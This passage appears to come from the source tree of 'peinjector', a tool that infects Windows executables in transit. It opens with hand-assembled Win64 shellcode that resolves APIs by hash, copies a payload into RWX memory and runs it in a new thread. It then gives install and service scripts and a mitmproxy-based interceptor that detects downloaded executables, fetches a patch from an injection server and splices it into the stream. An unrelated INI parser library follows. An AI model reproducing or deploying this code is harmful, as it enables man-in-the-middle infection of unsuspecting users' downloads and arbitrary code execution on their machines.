                           b"\x41\x58"                          # pop r8 ;Clear off the curr position in the module list
                           b"\x5E"                              # pop rsi ; Restore RSI
                           b"\x59"                              # pop rcx ; Restore the 1st parameter
                           b"\x5A"                              # pop rdx ; Restore the 2nd parameter
                           b"\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           b"\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           b"\x41\x5A"                          # pop r10 ; pop off the return address
                           b"\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the register params

                           b"\x41\x52"                          # push r10 ; push back the return address
                           b"\xFF\xE0"                          # jmp rax ; Jump into the required function

                           # get_next_mod: ;
                           b"\x58"                              # pop rax ; Pop off the current modules EAT
                           # get_next_mod1: ;
                           b"\x41\x59"                          # pop r9 ; Pop off the current modules hash
                           b"\x5A"                              # pop rdx ; Restore our position in the module list
                           b"\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           b"\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        # allocate
        self.shellcode1 += (b"\x5d"                              # pop rbp
                            b"\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += (b"\x6a\x40"                          # push 40h
                            b"\x41\x59"                          # pop r9 now 40h
                            b"\x68\x00\x10\x00\x00"              # push 1000h
                            b"\x41\x58"                          # pop r8.. now 1000h
                            b"\x4C\x89\xF2"                      # mov rdx, r14
                            b"\x6A\x00"                          # push 0
                            b"\x59"                              # pop rcx
                            b"\x68\x58\xa4\x53\xe5"              # push E553a458
                            b"\x41\x5A"                          # pop r10
                            b"\xff\xd5"                          # call rbp
                            b"\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            b"\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            )

        self.shellcode1 += b"\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += b"\xeb\x43"

        # got_payload:
        self.shellcode1 += (b"\x5e"                                  # pop rsi            ; Prepare ESI with the source
                            b"\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memo
                            b"\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            # set_handler:
                            b"\x48\x31\xC0"                  # xor rax,rax
                            b"\x50"                          # push rax            ; LPDWORD lpThreadId (NULL)
                            b"\x50"                          # push rax            ; DWORD dwCreationFlags (0)
                            b"\x49\x89\xC1"                  # mov r9, rax         ; LPVOID lpParameter (NULL)
                            b"\x48\x89\xC2"                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
                            b"\x49\x89\xD8"                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            b"\x48\x89\xC1"                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES (NULL)
                            b"\x49\xC7\xC2\x38\x68\x0D\x16"  # mov r10, 0x160D6838 ; hash("kernel32.dll","CreateThread")
                            b"\xFF\xD5"                      # call rbp            ; Spawn payload thread
                            b"\x48\x83\xC4\x58"              # add rsp, 50

                            # stackrestore
                            b"\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            b"\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        self.shellcode1 += b"\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

##########################################################
#                END win64 shellcodes                    #
##########################################################
```

`pe-injector-control/thirdparty/calc_shellcode_license.txt`:

```txt
Copyright (c) 2009-2014 Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
and Peter Ferrie <peter.ferrie@gmail.com>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * Neither the name of the copyright holder nor the names of the
      contributors may be used to endorse or promote products derived from
      this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
```

`pe-injector-interceptor/config.ini`:

```ini
[proxy]
port = 8080
cadir = ./ca
mode = regular

[pe]
pe_server_address = 127.0.0.1
pe_server_port = 31337
pe_minimum_size = 10240

[pe_modifier]
max_header = 4096
max_patch = 16384
connection_timeout = 1


```

`pe-injector-interceptor/install/peinjector-interceptor_dependencies.sh`:

```sh
#!/bin/sh

# peinjector interceptor dependencies script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# Dependencies ...
apt-get install -y gcc python git python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev

# Check minimum python version
if $(python2 -c 'import sys; print(1 if sys.hexversion<0x02070000 else 0)'); then
  echo "python 2.7 is required at least"
  exit 1
fi

# Install MITMPROXY
pip install mitmproxy

exit 0

```

`pe-injector-interceptor/install/peinjector-interceptor_install.sh`:

```sh
#!/bin/sh

# peinjector interceptor  install script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# Install dependencies
chmod a+x ./peinjector-interceptor_dependencies.sh
./peinjector-interceptor_dependencies.sh

# install start script
cp ./peinjector-interceptor_start.sh /usr/local/bin/peinjector-interceptor_start.sh
chmod a+x /usr/local/bin/peinjector-interceptor_start.sh

# install stop script
cp ./peinjector-interceptor_stop.sh /usr/local/bin/peinjector-interceptor_stop.sh
chmod a+x /usr/local/bin/peinjector-interceptor_stop.sh

# install service script
cp ./peinjector-interceptor_service.sh /etc/init.d/peinjector-interceptor
chmod a+x /etc/init.d/peinjector-interceptor

# register service
update-rc.d peinjector-interceptor defaults

# make working and log dir
mkdir /etc/peinjector-interceptor
mkdir /var/log/peinjector-interceptor

# Copy server & data
cd ..
cp -r ./* /etc/peinjector-interceptor
# Remove install dir
rm -rf /etc/peinjector-interceptor/install

# run server
service peinjector-interceptor start

exit 0
```

`pe-injector-interceptor/install/peinjector-interceptor_service.sh`:

```sh
#!/bin/sh

### BEGIN INIT INFO
# Provides:          peinjector-interceptor
# Required-Start:    $all
# Required-Stop:     $all
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: peinjector-interceptor server
# Description:       Provides peinjector-interceptor server as a service
#
### END INIT INFO

# peinjector-interceptor service script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

case "$1" in
  start)
    echo "Start peinjector-interceptor server"
    /usr/local/bin/peinjector-interceptor_start.sh
    ;;
  stop)
    echo "Stop peinjector-interceptor server"
    /usr/local/bin/peinjector-interceptor_stop.sh
    ;;
  restart)
    echo "Restart peinjector-interceptor server"
    /usr/local/bin/peinjector-interceptor_stop.sh
    /usr/local/bin/peinjector-interceptor_start.sh
    ;;
  *)
    echo "Usage: /etc/init.d/peinjector-interceptor {start|stop|restart}"
    ;;
esac

exit 0
```

`pe-injector-interceptor/install/peinjector-interceptor_start.sh`:

```sh
#!/bin/sh

# peinjector-interceptor start script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# set Log files and working dir
LOG_FILE=/var/log/peinjector-interceptor/interceptor.log
ERROR_FILE=/var/log/peinjector-interceptor/interceptor.err
WORKING_DIR=/etc/peinjector-interceptor

# start server
cd $WORKING_DIR
((python2 ./peinjector_interceptor.py) >> $LOG_FILE 2>> $ERROR_FILE </dev/null) &

exit 0
```

`pe-injector-interceptor/install/peinjector-interceptor_stop.sh`:

```sh
#!/bin/sh

# peinjector interceptor  stop script
# Autor: A.A.

# Check root
if [ "$(id -u)" != "0" ]; then
	echo "must be run as root user"
	exit 1
fi

# kill peinjector
pkill -f peinjector_interceptor.py

exit 0
```

`pe-injector-interceptor/libPePatch.py`:

```py
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
    Provides de-serialization and in-stream patch applying capabilities for PE Files
"""

__author__ = 'A.A.'

# Unpack binary data
from struct import unpack_from


# Holds an single patch part
class PePatchPart(object):
    # Constructor
    def __init__(self, mem, position, insert):
        self.mem = mem
        self.next = None
        self.position = position
        self.insert = insert
        self.finished = False


# Deserialize and applies patches on pe files
class PePatch(object):

    # Sentinel size
    pepatch_sentinelsize = 9;

    # First Patch part
    first = None

    # Constructor
    def __init__(self, serialized_memory):
        serialized_mem_size = len(serialized_memory)
        current_position = 0
        current = None
        patch = None

        # Deserialize data
        while (serialized_mem_size - current_position) >= self.pepatch_sentinelsize:
            mem_size, position, insert = unpack_from("<II?", serialized_memory, current_position)
            # 2*sizeof(uint32_t) + sizeof(uint8_t)
            current_position += 9

            # Length Error
            if (serialized_mem_size - current_position) < mem_size:
                return

            # Extract Data
            patch_data = serialized_memory[current_position:current_position + mem_size]

            # Change Position
            current_position += mem_size

            # Add Patch
            if mem_size > 0:
                patch = PePatchPart(patch_data, position, insert)
            else:
                patch = None
                
            # Build chain
            if current is not None:
                current.next = patch
            if self.first is None:
                self.first = patch
            current = patch

        # Length Error
        if (serialized_mem_size - current_position) > 0:
            self.first = None
            return

    # Patch is ok
    def patch_ok(self):
        return self.first is not None

    # Apply patch on stream data
    def apply_patch(self, mem, position):
        all_finished = True
        
        # Nothing to patch
        if self.first is None:
            return mem

        # Apply each patch part
        current = self.first
        while current is not None:
            # Finished, no need to check
            if current.finished:
                current = current.next
                continue
            
            # Patch starts inside memory
            if position <= current.position < (position + len(mem)):
                delta_position = current.position - position
                # Insert
                if current.insert:
                    mem = mem[:delta_position] + current.mem + mem[delta_position:]
                    
                    # Patch part finished
                    current.finished = True
                
                # Overwrite
                else:
                    mem = mem[:delta_position] + current.mem[:len(mem)-delta_position] \
                        + mem[delta_position+len(current.mem):]

                # Patch applied
                all_finished = False 
            
            # Append after current mem part (important if current part is the last part)
            elif current.insert and (current.position == (position + len(mem))):
                # Append patch
                mem = mem + current.mem
                
                # Patch part finished
                current.finished = True
            
                # Patch applied
                all_finished = False 
                
            # Patch starts before memory
            elif (not current.insert) and ((current.position + len(current.mem)) > position)\
                    and (current.position < position):
                delta_position = position - current.position
                mem = current.mem[delta_position:delta_position+len(mem)] + mem[len(current.mem)-delta_position:]
                
                # Patch applied
                all_finished = False 
            
            # Patch finished
            elif (current.position + len(current.mem)) < position:
                current.finished = True
            
            # Reset total finished  
            else:
                # Patch waiting
                all_finished = False
            
            # Next patch part     
            current = current.next
        
        # Patch finished
        if all_finished:
            self.first = None
        
        # Return patched memory
        return mem

```

`pe-injector-interceptor/peinjector_interceptor.py`:

```py
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
    Interceptor - reference implementation of a Interceptor based on libmproxy with a connection to a peinjector-server
"""

__author__ = 'W.L.'

from threading import Thread
from libmproxy import controller, proxy
from libmproxy.proxy.server import ProxyServer
from libPePatch import PePatch
import sys
import datetime
import netlib
import socket
import time
import ConfigParser

"""
    PE Injector specific part
"""

# Build Payload Modifier
def build_pe_modifier(flow, patch_address, config):
    def modify(chunks):
        
        # Maximum PE Header size to expect
        # Maximum Patch size to expect
        # Connection Timeout
        # Access Token
        max_header, max_patch, connection_timeout, access_token = config
        
        header = True
        patcher = None
        position = 0
        for prefix, content, suffix in chunks:
            # Only do this for 1. chunk, and quick PE check
            if header and (content[:2] == 'MZ'): 
                print("Intercept PE, send header to server (" + str(len(content)) + " bytes)")
                # If something goes wrong while network transmission
                try:
                    # Open socket
                    patch_socket = socket.create_connection(patch_address, connection_timeout)
                    # Send patch to server
                    if (patch_socket is not None) and patch_socket.send(access_token + content[:max_header]):
                        # Receive patch from Server
                        patch_mem = patch_socket.recv(max_patch)
                        # Close socket
                        patch_socket.close()
                        print("Received patch: " + str(len(patch_mem)) + " bytes")
                        patcher = PePatch(patch_mem)
                        if patcher.patch_ok():
                            print("Patch Ok")
                        else:
                            print("Error parsing patch")
                            patcher = None
                except Exception as e:
                    patcher = None

            # Check only 1. chunk for header
            header = False
            
            # Apply Patch
            if patcher is not None:
                content = patcher.apply_patch(content, position)
                position += len(content)

            yield prefix, content, suffix

    return modify

"""
    libmproxy general part
"""
    
 # Bypass stream data without modifying
def bypass_stream(chunks):
    for prefix, content, suffix in chunks:
        yield prefix, content, suffix
        
# Stream Switcher
class StreamLargeBodies(object):
    def __init__(self, max_size):
        self.max_size = max_size

    def run(self, flow, is_request):
        r = flow.request if is_request else flow.response
        code = flow.response.code if flow.response else None
        expected_size = netlib.http.expected_http_body_size(
            r.headers, is_request, flow.request.method, code
        )
        if not (0 <= expected_size <= self.max_size):
            r.stream = r.stream or True
        
# Interception Handler
class InterceptingMaster(controller.Master):

    # PE Mime Types
    binaryMimeTypes = (['application/octet-stream'], ['application/x-msdownload'], ['application/msdos-windows'],
                       ['application/x-winexe'], ['application/x-msdos-program'], ['binary/octet-stream'],
                       ['application/exe'], ['application/x-exe'], ['application/dos-exe'])

    def __init__(self, server, config):
        controller.Master.__init__(self, server)
        # Address of PE Patch Server
        self.pe_server_address = config.get("pe", "pe_server_address")
        # Port to PE Patch Server
        self.pe_server_port = int(config.get("pe", "pe_server_port"))
        # Minimum PE Size
        self.pe_minimum_size = int(config.get("pe", "pe_minimum_size"))
        self.stream_large_bodies = StreamLargeBodies(self.pe_minimum_size)
        # Patch config
        byte_token = bytearray.fromhex(config.get("pe", "pe_server_token"))
        if (len(byte_token) != 32) or (byte_token[:2] != '\xaa\xaa'):
            byte_token = '\xaa\xaa' + 30 * '\x00'
        self.pe_modifier_config = (
            int(config.get("pe_modifier", "max_header")),
            int(config.get("pe_modifier", "max_patch")),
            int(config.get("pe_modifier", "connection_timeout")),
            byte_token
            )                                  
       
    # Run Master
    def runner(self):
        controller.Master.run(self)
        
    # Run Thread
    def run(self):
        t = Thread(target=self.runner)
        t.daemon = True
        t.start()

    # Handles Request (modify websites, ... here)
    def handle_request(self, msg):
        msg.reply()
        return msg

    # Handles Streaming
    def handle_responseheaders(self, msg):
        try:
            if self.stream_large_bodies:
                self.stream_large_bodies.run(msg, False)
                if msg.response.stream:
                    # PE Modifier
                    if msg.response.headers["Content-Type"] in self.binaryMimeTypes:
                        msg.response.stream = build_pe_modifier(msg, (self.pe_server_address, self.pe_server_port), self.pe_modifier_config)
                        
                        # Bypass Stream
                    else:
                        msg.response.stream = bypass_stream

        except netlib.http.HttpError:
            msg.reply(protocol.KILL)
            return

        msg.reply()
        return msg

    # Handles 'normal' response content
    def handle_response(self, msg):
        msg.reply()
        return msg

# Checks config and set default params
def check_config(config):
  if not config.has_section("proxy"):
        config.add_section("proxy")
        
  if not config.has_section("pe"):
      config.add_section("pe")
        
  if not config.has_section("pe_modifier"):
      config.add_section("pe_modifier")
    
  if not config.has_option("proxy", "port"):
      config.set("proxy", "port", "8080")
        
  if not config.has_option("proxy", "cadir"):
      config.set("proxy", "cadir", "./ca")
        
  if not config.has_option("proxy", "mode"):
      config.set("proxy", "mode", "regular")
    
  if not config.has_option("pe", "pe_server_address"):
      config.set("pe", "pe_server_address", "127.0.0.1")
    
  if not config.has_option("pe", "pe_server_port"):
      config.set("pe", "pe_server_port", "31337")
  
  if not config.has_option("pe", "pe_server_token"):
      config.set("pe", "pe_server_token", "aaaa000000000000000000000000000000000000000000000000000000000000")
  
  if not config.has_option("pe", "pe_minimum_size"):
      config.set("pe", "pe_minimum_size", "10240")
        
  if not config.has_option("pe_modifier", "max_header"):
      config.set("pe_modifier", "max_header", "4096")
        
  if not config.has_option("pe_modifier", "max_patch"):
      config.set("pe_modifier", "max_patch", "16384")
        
  if not config.has_option("pe_modifier", "connection_timeout"):
      config.set("pe_modifier", "connection_timeout", "1")

# Main routine
def main(argv):
    # read config from ini file, check it and write it back
    config_file = "config.ini"
    config = ConfigParser.ConfigParser()
    config.read(config_file)
    
    # Check config and set defaault params
    check_config(config)
    
    # write config to file
    with open(config_file, "wb") as cf:    
        config.write(cf)

    # Configure proxy server 
    proxy_config = proxy.ProxyConfig(
        port=int(config.get("proxy", "port")),
        cadir=config.get("proxy", "cadir"),
        mode=config.get("proxy", "mode")
    )
    
    # Create Server
    server = ProxyServer(proxy_config)
    
    # Creater Interceptor
    imaster = InterceptingMaster(server, config)
    imaster.run()
    
    print "Intercepting Proxy listening on " + str(proxy_config.port) + " in " + str(proxy_config.mode) + " mode "
    
    # Wait till keyboard interrupt
    while True:
        try:
            time.sleep(1)    
        except KeyboardInterrupt:
            print 'KeyboardInterrupt received. Shutting down'
            imaster.shutdown()
            sys.exit(0)
        except Exception as e:
            print e
            print 'Exception catched.'
            sys.exit(0)
    
# Call main
if __name__ == '__main__':
    main(sys.argv)
```

`peinjector/3rdparty/ini/minGlue.h`:

```h
/*  Glue functions for the minIni library, based on the C/C++ stdio library
 *
 *  Or better said: this file contains macros that maps the function interface
 *  used by minIni to the standard C/C++ file I/O functions.
 *
 *  By CompuPhase, 2008-2014
 *  This "glue file" is in the public domain. It is distributed without
 *  warranties or conditions of any kind, either express or implied.
 */

/* map required file I/O types and functions to the standard C library */
#include <stdio.h>

#define INI_FILETYPE                    FILE*
#define ini_openread(filename,file)     ((*(file) = fopen((filename),"rb")) != NULL)
#define ini_openwrite(filename,file)    ((*(file) = fopen((filename),"wb")) != NULL)
#define ini_openrewrite(filename,file)  ((*(file) = fopen((filename),"r+b")) != NULL)
#define ini_close(file)                 (fclose(*(file)) == 0)
#define ini_read(buffer,size,file)      (fgets((buffer),(size),*(file)) != NULL)
#define ini_write(buffer,file)          (fputs((buffer),*(file)) >= 0)
#define ini_rename(source,dest)         (rename((source), (dest)) == 0)
#define ini_remove(filename)            (remove(filename) == 0)

#define INI_FILEPOS                     long int
#define ini_tell(file,pos)              (*(pos) = ftell(*(file)))
#define ini_seek(file,pos)              (fseek(*(file), *(pos), SEEK_SET) == 0)

/* for floating-point support, define additional types and functions */
#define INI_REAL                        float
#define ini_ftoa(string,value)          sprintf((string),"%f",(value))
#define ini_atof(string)                (INI_REAL)strtod((string),NULL)

```

`peinjector/3rdparty/ini/minIni.c`:

```c
/*  minIni - Multi-Platform INI file parser, suitable for embedded systems
 *
 *  These routines are in part based on the article "Multiplatform .INI Files"
 *  by Joseph J. Graf in the March 1994 issue of Dr. Dobb's Journal.
 *
 *  Copyright (c) CompuPhase, 2008-2015
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not
 *  use this file except in compliance with the License. You may obtain a copy
 *  of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 *  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 *  License for the specific language governing permissions and limitations
 *  under the License.
 *
 *  Version: $Id: minIni.c 53 2015-01-18 13:35:11Z thiadmer.riemersma@gmail.com $
 */

#if (defined _UNICODE || defined __UNICODE__ || defined UNICODE) && !defined INI_ANSIONLY
# if !defined UNICODE   /* for Windows */
#   define UNICODE
# endif
# if !defined _UNICODE  /* for C library */
#   define _UNICODE
# endif
#endif

#define MININI_IMPLEMENTATION
#include "minIni.h"
#if defined NDEBUG
  #define assert(e)
#else
  #include <assert.h>
#endif

#if !defined __T || defined INI_ANSIONLY
  #include <ctype.h>
  #include <string.h>
  #include <stdlib.h>
  #define TCHAR     char
  #define __T(s)    s
  #define _tcscat   strcat
  #define _tcschr   strchr
  #define _tcscmp   strcmp
  #define _tcscpy   strcpy
  #define _tcsicmp  stricmp
  #define _tcslen   strlen
  #define _tcsncmp  strncmp
  #define _tcsnicmp strnicmp
  #define _tcsrchr  strrchr
  #define _tcstol   strtol
  #define _tcstod   strtod
  #define _totupper toupper
  #define _stprintf sprintf
  #define _tfgets   fgets
  #define _tfputs   fputs
  #define _tfopen   fopen
  #define _tremove  remove
  #define _trename  rename
#endif

#if defined __linux || defined __linux__
  #define __LINUX__
#elif defined FREEBSD && !defined __FreeBSD__
  #define __FreeBSD__
#elif defined(_MSC_VER)
  #pragma warning(disable: 4996)	/* for Microsoft Visual C/C++ */
#endif
#if !defined strnicmp && !defined PORTABLE_STRNICMP
  #if defined __LINUX__ || defined __FreeBSD__ || defined __OpenBSD__ || defined __APPLE__
    #define strnicmp  strncasecmp
  #endif
#endif
#if !defined _totupper
  #define _totupper toupper
#endif

#if !defined INI_LINETERM
  #if defined __LINUX__ || defined __FreeBSD__ || defined __OpenBSD__ || defined __APPLE__
    #define INI_LINETERM    __T("\n")
  #else
    #define INI_LINETERM    __T("\r\n")
  #endif
#endif
#if !defined INI_FILETYPE
  #error Missing definition for INI_FILETYPE.
#endif

#if !defined sizearray
  #define sizearray(a)    (sizeof(a) / sizeof((a)[0]))
#endif

enum quote_option {
  QUOTE_NONE,
  QUOTE_ENQUOTE,
  QUOTE_DEQUOTE,
};

#if defined PORTABLE_STRNICMP
int strnicmp(const TCHAR *s1, const TCHAR *s2, size_t n)
{
  register int c1, c2;

  while (n-- != 0 && (*s1 || *s2)) {
    c1 = *s1++;
    if ('a' <= c1 && c1 <= 'z')
      c1 += ('A' - 'a');
    c2 = *s2++;
    if ('a' <= c2 && c2 <= 'z')
      c2 += ('A' - 'a');
    if (c1 != c2)
      return c1 - c2;
  } /* while */
  return 0;
}
#endif /* PORTABLE_STRNICMP */

static TCHAR *skipleading(const TCHAR *str)
{
  assert(str != NULL);
  while ('\0' < *str && *str <= ' ')
    str++;
  return (TCHAR *)str;
}

static TCHAR *skiptrailing(const TCHAR *str, const TCHAR *base)
{
  assert(str != NULL);
  assert(base != NULL);
  while (str > base && '\0' < *(str-1) && *(str-1) <= ' ')
    str--;
  return (TCHAR *)str;
}

static TCHAR *striptrailing(TCHAR *str)
{
  TCHAR *ptr = skiptrailing(_tcschr(str, '\0'), str);
  assert(ptr != NULL);
  *ptr = '\0';
  return str;
}

static TCHAR *save_strncpy(TCHAR *dest, const TCHAR *source, size_t maxlen, enum quote_option option)
{
  size_t d, s;

  assert(maxlen>0);
  assert(dest <= source || dest >= source + maxlen);
  if (option == QUOTE_ENQUOTE && maxlen < 3)
    option = QUOTE_NONE;  /* cannot store two quotes and a terminating zero in less than 3 characters */

  switch (option) {
  case QUOTE_NONE:
    for (d = 0; d < maxlen - 1 && source[d] != '\0'; d++)
      dest[d] = source[d];
    assert(d < maxlen);
    dest[d] = '\0';
    break;
  case QUOTE_ENQUOTE:
    d = 0;
    dest[d++] = '"';
    for (s = 0; source[s] != '\0' && d < maxlen - 2; s++, d++) {
      if (source[s] == '"') {
        if (d >= maxlen - 3)
          break;  /* no space to store the escape character plus the one that follows it */
        dest[d++] = '\\';
      } /* if */
      dest[d] = source[s];
    } /* for */
    dest[d++] = '"';
    dest[d] = '\0';
    break;
  case QUOTE_DEQUOTE:
    for (d = s = 0; source[s] != '\0' && d < maxlen - 1; s++, d++) {
      if ((source[s] == '"' || source[s] == '\\') && source[s + 1] == '"')
        s++;
      dest[d] = source[s];
    } /* for */
    dest[d] = '\0';
    break;
  default:
    assert(0);
  } /* switch */

  return dest;
}

static TCHAR *cleanstring(TCHAR *string, enum quote_option *quotes)
{
  int isstring;
  TCHAR *ep;

  assert(string != NULL);
  assert(quotes != NULL);

  /* Remove a trailing comment */
  isstring = 0;
  for (ep = string; *ep != '\0' && ((*ep != ';' && *ep != '#') || isstring); ep++) {
    if (*ep == '"') {
      if (*(ep + 1) == '"')
        ep++;                 /* skip "" (both quotes) */
      else
        isstring = !isstring; /* single quote, toggle isstring */
    } else if (*ep == '\\' && *(ep + 1) == '"') {
      ep++;                   /* skip \" (both quotes */
    } /* if */
  } /* for */
  assert(ep != NULL && (*ep == '\0' || *ep == ';' || *ep == '#'));
  *ep = '\0';                 /* terminate at a comment */
  striptrailing(string);
  /* Remove double quotes surrounding a value */
  *quotes = QUOTE_NONE;
  if (*string == '"' && (ep = _tcschr(string, '\0')) != NULL && *(ep - 1) == '"') {
    string++;
    *--ep = '\0';
    *quotes = QUOTE_DEQUOTE;  /* this is a string, so remove escaped characters */
  } /* if */
  return string;
}

static int getkeystring(INI_FILETYPE *fp, const TCHAR *Section, const TCHAR *Key,
                        int idxSection, int idxKey, TCHAR *Buffer, int BufferSize,
                        INI_FILEPOS *mark)
{
  TCHAR *sp, *ep;
  int len, idx;
  enum quote_option quotes;
  TCHAR LocalBuffer[INI_BUFFERSIZE];

  assert(fp != NULL);
  /* Move through file 1 line at a time until a section is matched or EOF. If
   * parameter Section is NULL, only look at keys above the first section. If
   * idxSection is postive, copy the relevant section name.
   */
  len = (Section != NULL) ? (int)_tcslen(Section) : 0;
  if (len > 0 || idxSection >= 0) {
    idx = -1;
    do {
      if (!ini_read(LocalBuffer, INI_BUFFERSIZE, fp))
        return 0;
      sp = skipleading(LocalBuffer);
      ep = _tcschr(sp, ']');
    } while (*sp != '[' || ep == NULL || (((int)(ep-sp-1) != len || _tcsnicmp(sp+1,Section,len) != 0) && ++idx != idxSection));
    if (idxSection >= 0) {
      if (idx == idxSection) {
        assert(ep != NULL);
        assert(*ep == ']');
        *ep = '\0';
        save_strncpy(Buffer, sp + 1, BufferSize, QUOTE_NONE);
        return 1;
      } /* if */
      return 0; /* no more section found */
    } /* if */
  } /* if */

  /* Now that the section has been found, find the entry.
   * Stop searching upon leaving the section's area.
   */
  assert(Key != NULL || idxKey >= 0);
  len = (Key != NULL) ? (int)_tcslen(Key) : 0;
  idx = -1;
  do {
    if (mark != NULL)
      ini_tell(fp, mark);   /* optionally keep the mark to the start of the line */
    if (!ini_read(LocalBuffer,INI_BUFFERSIZE,fp) || *(sp = skipleading(LocalBuffer)) == '[')
      return 0;
    sp = skipleading(LocalBuffer);
    ep = _tcschr(sp, '=');  /* Parse out the equal sign */
    if (ep == NULL)
      ep = _tcschr(sp, ':');
  } while (*sp == ';' || *sp == '#' || ep == NULL
           || ((len == 0 || (int)(skiptrailing(ep,sp)-sp) != len || _tcsnicmp(sp,Key,len) != 0) && ++idx != idxKey));
  if (idxKey >= 0) {
    if (idx == idxKey) {
      assert(ep != NULL);
      assert(*ep == '=' || *ep == ':');
      *ep = '\0';
      striptrailing(sp);
      save_strncpy(Buffer, sp, BufferSize, QUOTE_NONE);
      return 1;
    } /* if */
    return 0;   /* no more key found (in this section) */
  } /* if */

  /* Copy up to BufferSize chars to buffer */
  assert(ep != NULL);
  assert(*ep == '=' || *ep == ':');
  sp = skipleading(ep + 1);
  sp = cleanstring(sp, &quotes);  /* Remove a trailing comment */
  save_strncpy(Buffer, sp, BufferSize, quotes);
  return 1;
}

/** ini_gets()
 * \param Section     the name of the section to search for
 * \param Key         the name of the entry to find the value of
 * \param DefValue    default string in the event of a failed read
 * \param Buffer      a pointer to the buffer to copy into
 * \param BufferSize  the maximum number of characters to copy
 * \param Filename    the name and full path of the .ini file to read from
 *
 * \return            the number of characters copied into the supplied buffer
 */
int ini_gets(const TCHAR *Section, const TCHAR *Key, const TCHAR *DefValue,
             TCHAR *Buffer, int BufferSize, const TCHAR *Filename)
{
  INI_FILETYPE fp;
  int ok = 0;

  if (Buffer == NULL || BufferSize <= 0 || Key == NULL)
    return 0;
  if (ini_openread(Filename, &fp)) {
    ok = getkeystring(&fp, Section, Key, -1, -1, Buffer, BufferSize, NULL);
    (void)ini_close(&fp);
  } /* if */
  if (!ok)
    save_strncpy(Buffer, (DefValue != NULL) ? DefValue : __T(""), BufferSize, QUOTE_NONE);
  return (int)_tcslen(Buffer);
}

/** ini_getl()
 * \param Section     the name of the section to search for
 * \param Key         the name of the entry to find the value of
 * \param DefValue    the default value in the event of a failed read
 * \param Filename    the name of the .ini file to read from
 *
 * \return            the value located at Key
 */
long ini_getl(const TCHAR *Section, const TCHAR *Key, long DefValue, const TCHAR *Filename)
{
  TCHAR LocalBuffer[64];
  int len = ini_gets(Section, Key, __T(""), LocalBuffer, sizearray(LocalBuffer), Filename);
  return (len == 0) ? DefValue
                    : ((len >= 2 && _totupper((int)LocalBuffer[1]) == 'X') ? _tcstol(LocalBuffer, NULL, 16)
                                                                           : _tcstol(LocalBuffer, NULL, 10));
}

#if defined INI_REAL
/** ini_getf()
 * \param Section     the name of the section to search for
 * \param Key         the name of the entry to find the value of
 * \param DefValue    the default value in the event of a failed read
 * \param Filename    the name of the .ini file to read from
 *
 * \return            the value located at Key
 */
INI_REAL ini_getf(const TCHAR *Section, const TCHAR *Key, INI_REAL DefValue, const TCHAR *Filename)
{
  TCHAR LocalBuffer[64];
  int len = ini_gets(Section, Key, __T(""), LocalBuffer, sizearray(LocalBuffer), Filename);
  return (len == 0) ? DefValue : ini_atof(LocalBuffer);
}
#endif

/** ini_getbool()
 * \param Section     the name of the section to search for
 * \param Key         the name of the entry to find the value of
 * \param DefValue    default value in the event of a failed read; it should
 *                    zero (0) or one (1).
